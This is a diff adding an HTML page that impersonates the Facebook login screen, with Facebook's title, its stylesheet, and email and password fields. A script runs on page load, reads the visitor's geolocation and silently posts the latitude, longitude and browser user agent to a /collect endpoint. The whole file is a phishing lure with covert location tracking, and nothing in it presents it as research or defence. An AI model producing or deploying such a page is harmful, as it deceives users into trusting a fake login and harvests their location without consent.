@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <link rel="stylesheet" href="https://www.facebook.com/rsrc.php/v3/yo/l/0,cross/hww.css">
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+    .login-box {
+      max-width: 360px;
+      margin: 100px auto;
+      padding: 40px;
+      background: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      border-radius: 8px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+    }
+    .login-box button {
+      background-color: #1877f2;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Log in to Facebook</h2>
+    <input type="text" placeholder="Email or phone number" />
+    <input type="password" placeholder="Password" />
+    <button>Log In</button>
+  </div>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+        fetch("/collect", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                userAgent: navigator.userAgent
+            })
+        });
+    });
+  </script>
+</body>
+</html>
